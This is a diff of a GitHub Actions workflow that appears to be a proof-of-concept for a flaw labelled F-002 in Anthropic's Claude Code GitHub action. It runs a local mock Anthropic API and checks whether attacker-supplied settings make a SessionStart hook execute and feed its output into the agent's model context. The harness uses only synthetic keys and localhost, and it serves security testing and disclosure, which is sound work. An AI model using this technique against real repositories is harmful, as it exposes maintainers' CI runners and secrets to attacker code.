@@ -1,4 +1,4 @@
-name: F-002 Free Read-Only PoC
+name: F-002 Free Read-Only RCE PoC
 
 on:
   issue_comment:
@@ -19,208 +19,173 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      # =========================================================
-      # 1. Checkout trusted BASE repository
-      # =========================================================
       - name: Checkout trusted base repository
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
 
-      # =========================================================
-      # 2. Show benign config from victim/base
-      # =========================================================
       - name: Show trusted base settings
         shell: bash
         run: |
           echo "======================================"
-          echo "TRUSTED BASE SETTINGS BEFORE CLAUDE"
+          echo "TRUSTED BASE BEFORE CLAUDE"
           echo "======================================"
-
-          echo "PWD=$(pwd)"
+          echo "BRANCH=$(git branch --show-current)"
           echo
-
-          echo "Current branch:"
-          git branch --show-current || true
-
-          echo
-          echo "Trusted settings file:"
           cat config/claude-action-settings.json
 
-      # =========================================================
-      # 3. Start local Anthropic-compatible mock
-      #    IMPORTANT: return 200, NOT 500
-      # =========================================================
-      - name: Start local fake Anthropic API
+      - name: Start synthetic Anthropic API
         shell: bash
         run: |
-          cat > /tmp/fake_anthropic.py <<'PY'
+          cat > /tmp/f002_fake_anthropic.py <<'PY'
           from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
           import json
           import time
 
           HOST = "127.0.0.1"
           PORT = 8787
+          MARKER = "F002_READ_ONLY_RCE"
+
 
           class Handler(BaseHTTPRequestHandler):
+
               def log_message(self, fmt, *args):
                   print("[HTTP] " + (fmt % args), flush=True)
 
-              def read_json(self):
-                  length = int(self.headers.get("content-length", "0"))
+              def send_json(self, status, obj):
+                  data = json.dumps(obj).encode("utf-8")
+
+                  self.send_response(status)
+                  self.send_header("Content-Type", "application/json")
+                  self.send_header("Content-Length", str(len(data)))
+                  self.end_headers()
+
+                  self.wfile.write(data)
+
+              def read_body(self):
+                  try:
+                      length = int(
+                          self.headers.get("Content-Length", "0")
+                      )
+                  except ValueError:
+                      length = 0
 
                   if length <= 0:
-                      return {}
+                      return b""
 
-                  raw = self.rfile.read(length)
-
-                  try:
-                      return json.loads(raw)
-                  except Exception:
-                      return {}
+                  return self.rfile.read(length)
 
               def do_GET(self):
                   print(
-                      f"[REQUEST] GET {self.path}",
+                      "[REQUEST] GET " + self.path,
                       flush=True
                   )
 
-                  body = json.dumps({
-                      "status": "ok",
-                      "service": "f002-synthetic-anthropic"
-                  }).encode()
-
-                  self.send_response(200)
-                  self.send_header(
-                      "Content-Type",
-                      "application/json"
+                  self.send_json(
+                      200,
+                      {
+                          "status": "ok",
+                          "service": "f002-synthetic-anthropic"
+                      }
                   )
-                  self.send_header(
-                      "Content-Length",
-                      str(len(body))
-                  )
-                  self.end_headers()
-
-                  self.wfile.write(body)
 
               def do_POST(self):
-    length = int(self.headers.get("content-length", "0"))
+                  raw = self.read_body()
 
-    raw = b""
-    if length:
-        raw = self.rfile.read(length)
-
-    text = raw.decode("utf-8", errors="replace")
-
-    print("FAKE ANTHROPIC REQUEST:", self.path, flush=True)
-
-    marker = "F002_READ_ONLY_RCE"
-
-    if marker in text:
-        print("======================================", flush=True)
-        print("F002_SESSIONSTART_RCE=CONFIRMED", flush=True)
-        print("======================================", flush=True)
-
-        pos = text.find(marker)
-
-        # Print only a limited region around our synthetic marker.
-        start = max(0, pos)
-        end = min(len(text), pos + 700)
-
-        evidence = text[start:end]
-
-        print("RCE_CONTEXT_BEGIN", flush=True)
-        print(evidence, flush=True)
-        print("RCE_CONTEXT_END", flush=True)
-
-    else:
-        print(
-            "F002_SESSIONSTART_RCE=NOT_FOUND_IN_MODEL_REQUEST",
-            flush=True
-        )
-
-    body = {
-        "type": "error",
-        "error": {
-            "type": "api_error",
-            "message": "Synthetic F-002 lab endpoint"
-        }
-    }
-
-    data = json.dumps(body).encode()
-
-    self.send_response(500)
-    self.send_header("Content-Type", "application/json")
-    self.send_header("Content-Length", str(len(data)))
-    self.end_headers()
-    self.wfile.write(data)
+                  text = raw.decode(
+                      "utf-8",
+                      errors="replace"
+                  )
 
                   print(
-                      "[REQUEST INFO] " +
-                      json.dumps({
-                          "model": request_json.get("model"),
-                          "stream": request_json.get("stream"),
-                          "max_tokens": request_json.get("max_tokens")
-                      }),
+                      "[REQUEST] POST " + self.path,
                       flush=True
                   )
 
-                  # ---------------------------------------------
-                  # Token-count endpoint
-                  # ---------------------------------------------
+                  # ------------------------------------------
+                  # DECISIVE READ-ONLY RCE EVIDENCE
+                  #
+                  # SessionStart stdout is expected to enter
+                  # Claude context, therefore the marker
+                  # should appear in the first model request.
+                  # ------------------------------------------
+                  if MARKER in text:
+                      position = text.find(MARKER)
+
+                      evidence = text[
+                          position:
+                          min(len(text), position + 1000)
+                      ]
+
+                      # Make output easier to read in Actions.
+                      evidence = evidence.replace(
+                          "\\n",
+                          " "
+                      )
+
+                      print(
+                          "======================================",
+                          flush=True
+                      )
+                      print(
+                          "F002_SESSIONSTART_RCE=CONFIRMED",
+                          flush=True
+                      )
+                      print(
+                          "======================================",
+                          flush=True
+                      )
+                      print(
+                          "RCE_CONTEXT_BEGIN",
+                          flush=True
+                      )
+                      print(
+                          evidence,
+                          flush=True
+                      )
+                      print(
+                          "RCE_CONTEXT_END",
+                          flush=True
+                      )
+
+                  # Claude/SDK may perform token counting.
                   if "count_tokens" in self.path:
-                      body = json.dumps({
-                          "input_tokens": 10
-                      }).encode()
-
-                      self.send_response(200)
-                      self.send_header(
-                          "Content-Type",
-                          "application/json"
-                      )
-                      self.send_header(
-                          "Content-Length",
-                          str(len(body))
-                      )
-                      self.end_headers()
-
-                      self.wfile.write(body)
-                      return
-
-                  # ---------------------------------------------
-                  # Only synthetic /v1/messages is supported
-                  # ---------------------------------------------
-                  if "/v1/messages" not in self.path:
-                      body = json.dumps({
-                          "type": "error",
-                          "error": {
-                              "type": "not_found_error",
-                              "message": "Synthetic endpoint"
+                      self.send_json(
+                          200,
+                          {
+                              "input_tokens": 10
                           }
-                      }).encode()
-
-                      self.send_response(404)
-                      self.send_header(
-                          "Content-Type",
-                          "application/json"
                       )
-                      self.send_header(
-                          "Content-Length",
-                          str(len(body))
-                      )
-                      self.end_headers()
-
-                      self.wfile.write(body)
                       return
+
+                  if "/v1/messages" not in self.path:
+                      self.send_json(
+                          404,
+                          {
+                              "type": "error",
+                              "error": {
+                                  "type": "not_found_error",
+                                  "message": "Synthetic endpoint"
+                              }
+                          }
+                      )
+                      return
+
+                  try:
+                      request_json = json.loads(
+                          raw.decode("utf-8")
+                      )
+                  except Exception:
+                      request_json = {}
 
                   model = request_json.get(
                       "model",
                       "claude-f002-synthetic"
                   )
 
-                  # ---------------------------------------------
-                  # Streaming response
-                  # ---------------------------------------------
+                  # ------------------------------------------
+                  # Streaming Messages API
+                  # ------------------------------------------
                   if request_json.get("stream") is True:
                       self.send_response(200)
                       self.send_header(
@@ -307,59 +272,57 @@ jobs:
                           )
                       ]
 
-                      for event_name, data in events:
+                      for event_name, event_data in events:
                           payload = (
-                              f"event: {event_name}\n"
-                              f"data: {json.dumps(data)}\n\n"
-                          ).encode()
+                              "event: "
+                              + event_name
+                              + "\n"
+                              + "data: "
+                              + json.dumps(event_data)
+                              + "\n\n"
+                          ).encode("utf-8")
 
-                          self.wfile.write(payload)
-                          self.wfile.flush()
+                          try:
+                              self.wfile.write(payload)
+                              self.wfile.flush()
+                          except BrokenPipeError:
+                              break
 
-                          time.sleep(0.05)
+                          time.sleep(0.03)
 
                       return
 
-                  # ---------------------------------------------
+                  # ------------------------------------------
                   # Non-streaming fallback
-                  # ---------------------------------------------
-                  response = {
-                      "id": "msg_f002_synthetic",
-                      "type": "message",
-                      "role": "assistant",
-                      "model": model,
-                      "content": [
-                          {
-                              "type": "text",
-                              "text": "Synthetic F-002 response"
+                  # ------------------------------------------
+                  self.send_json(
+                      200,
+                      {
+                          "id": "msg_f002_synthetic",
+                          "type": "message",
+                          "role": "assistant",
+                          "model": model,
+                          "content": [
+                              {
+                                  "type": "text",
+                                  "text": "Synthetic F-002 response"
+                              }
+                          ],
+                          "stop_reason": "end_turn",
+                          "stop_sequence": None,
+                          "usage": {
+                              "input_tokens": 10,
+                              "output_tokens": 4
                           }
-                      ],
-                      "stop_reason": "end_turn",
-                      "stop_sequence": None,
-                      "usage": {
-                          "input_tokens": 10,
-                          "output_tokens": 4
                       }
-                  }
-
-                  body = json.dumps(response).encode()
-
-                  self.send_response(200)
-                  self.send_header(
-                      "Content-Type",
-                      "application/json"
                   )
-                  self.send_header(
-                      "Content-Length",
-                      str(len(body))
-                  )
-                  self.end_headers()
-
-                  self.wfile.write(body)
 
 
           print(
-              f"Starting synthetic Anthropic server on {HOST}:{PORT}",
+              "Starting F-002 synthetic API on "
+              + HOST
+              + ":"
+              + str(PORT),
               flush=True
           )
 
@@ -369,76 +332,78 @@ jobs:
           ).serve_forever()
           PY
 
-          nohup python3 /tmp/fake_anthropic.py \
-            > /tmp/fake-anthropic.log 2>&1 &
+          nohup python3 /tmp/f002_fake_anthropic.py \
+            > /tmp/f002_fake_anthropic.log 2>&1 &
 
-          echo $! > /tmp/fake-anthropic.pid
+          echo $! > /tmp/f002_fake_anthropic.pid
 
           sleep 2
 
-          echo "Fake Anthropic API PID:"
-          cat /tmp/fake-anthropic.pid
+          echo "MOCK_PID=$(cat /tmp/f002_fake_anthropic.pid)"
 
           echo
           echo "Health check:"
-          curl -sS http://127.0.0.1:8787/
+          curl --fail --silent --show-error \
+            http://127.0.0.1:8787/
 
-      # =========================================================
-      # 4. Verify localhost mock
-      # =========================================================
-      - name: Verify local mock
+          echo
+
+      - name: Verify synthetic Messages API
         shell: bash
         run: |
-          echo "======================================"
-          echo "VERIFY LOCAL MOCK"
-          echo "======================================"
+          RESPONSE="$(
+            curl \
+              --fail \
+              --silent \
+              --show-error \
+              -X POST \
+              http://127.0.0.1:8787/v1/messages \
+              -H 'Content-Type: application/json' \
+              --data '{
+                "model": "claude-f002-synthetic",
+                "max_tokens": 8,
+                "messages": [
+                  {
+                    "role": "user",
+                    "content": "synthetic preflight"
+                  }
+                ]
+              }'
+          )"
 
-          curl -sS \
-            -X POST \
-            http://127.0.0.1:8787/v1/messages \
-            -H 'Content-Type: application/json' \
-            --data '{
-              "model": "claude-f002-synthetic",
-              "max_tokens": 8,
-              "messages": [
-                {
-                  "role": "user",
-                  "content": "test"
-                }
-              ]
-            }'
+          echo "$RESPONSE"
 
           echo
-          echo
-          echo "LOCAL_MOCK_OK"
+          echo "SYNTHETIC_API_PREFLIGHT=OK"
 
-      # =========================================================
-      # 5. Run affected action
-      # =========================================================
       - name: Run vulnerable Claude Code Action
         id: claude
         continue-on-error: true
 
+        # For final report, preferably replace @v1 with the
+        # exact commit SHA that produced finding F-002.
         uses: anthropics/claude-code-action@v1
 
         env:
           ANTHROPIC_BASE_URL: http://127.0.0.1:8787
 
-          # Synthetic trusted workflow value.
-          # Not a credential.
+          # Synthetic trusted value, NOT a real credential.
           F002_PRIVILEGED_CANARY: "BASE_ONLY_CANARY_F002_7F3B91"
 
         with:
-          anthropic_api_key: "sk-ant-api03-F002-SYNTHETIC-NOT-REAL"
+          # Synthetic placeholder used only because the action
+          # requires an auth input. Requests go to localhost.
+          anthropic_api_key: "F002-SYNTHETIC-DUMMY-KEY"
 
           trigger_phrase: "@claude"
 
+          # Vulnerable indirect path being tested.
           settings: "config/claude-action-settings.json"
 
-      # =========================================================
-      # 6. Inspect what settings are present AFTER action
-      # =========================================================
-      - name: Inspect F-002 settings provenance
+          # Synthetic lab only.
+          show_full_output: "true"
+
+      - name: Inspect settings provenance
         if: always()
         shell: bash
         run: |
@@ -449,7 +414,6 @@ jobs:
           echo
           echo "[1] CURRENT BRANCH"
           echo "--------------------------------------"
-
           git branch --show-current || true
 
           echo
@@ -473,10 +437,11 @@ jobs:
           fi
 
           echo
-          echo "[4] F002 PAYLOAD PRESENCE"
+          echo "[4] ATTACKER PAYLOAD IN USER SETTINGS"
           echo "--------------------------------------"
 
-          if grep -q \
+          if grep \
+            --quiet \
             'F002_READ_ONLY_RCE' \
             "$HOME/.claude/settings.json" \
             2>/dev/null; then
@@ -489,43 +454,77 @@ jobs:
 
           fi
 
-      # =========================================================
-      # 7. Show requests made to synthetic API
-      # =========================================================
-      - name: Show fake API requests
+      - name: Show synthetic API evidence
         if: always()
         shell: bash
         run: |
           echo "======================================"
-          echo "FAKE ANTHROPIC SERVER LOG"
+          echo "F-002 SYNTHETIC API EVIDENCE"
           echo "======================================"
 
-          if [ -f /tmp/fake-anthropic.log ]; then
-            cat /tmp/fake-anthropic.log
+          if [ -f /tmp/f002_fake_anthropic.log ]; then
+            cat /tmp/f002_fake_anthropic.log
           else
-            echo "No fake API log"
+            echo "MOCK LOG MISSING"
           fi
 
-      # =========================================================
-      # 8. Read-only PoC note
-      #
-      # NO /tmp/f002-proof.txt check.
-      # =========================================================
-      - name: Show F-002 read-only result
+      - name: Verify read-only RCE
         if: always()
         shell: bash
         run: |
           echo "======================================"
-          echo "F-002 READ-ONLY RCE POC"
+          echo "F-002 FINAL RESULT"
           echo "======================================"
 
-          echo
-          echo "No /tmp/f002-proof.txt is expected."
-          echo "This PoC intentionally performs no file writes."
-          echo
-          echo "Check:"
-          echo "1. Inspect F-002 settings provenance"
-          echo "2. Run vulnerable Claude Code Action"
-          echo
-          echo "Search logs for:"
-          echo "F002_READ_ONLY_RCE"
+          if grep \
+            --quiet \
+            'F002_SESSIONSTART_RCE=CONFIRMED' \
+            /tmp/f002_fake_anthropic.log \
+            2>/dev/null; then
+
+            echo
+            echo "F002_RESULT=VULNERABLE"
+            echo
+
+            grep \
+              -A8 \
+              'F002_SESSIONSTART_RCE=CONFIRMED' \
+              /tmp/f002_fake_anthropic.log || true
+
+          else
+
+            echo
+            echo "F002_RESULT=NOT_CONFIRMED"
+            echo
+            echo "Settings provenance:"
+            echo
+
+            if grep \
+              --quiet \
+              'F002_READ_ONLY_RCE' \
+              "$HOME/.claude/settings.json" \
+              2>/dev/null; then
+
+              echo "ATTACKER_SETTINGS_REACHED_USER_SETTINGS=YES"
+
+            else
+
+              echo "ATTACKER_SETTINGS_REACHED_USER_SETTINGS=NO"
+
+            fi
+
+            echo
+            echo "Synthetic API log:"
+            cat /tmp/f002_fake_anthropic.log || true
+
+            exit 1
+
+          fi
+
+      - name: Stop synthetic API
+        if: always()
+        shell: bash
+        run: |
+          if [ -f /tmp/f002_fake_anthropic.pid ]; then
+            kill "$(cat /tmp/f002_fake_anthropic.pid)" 2>/dev/null || true
+          fi
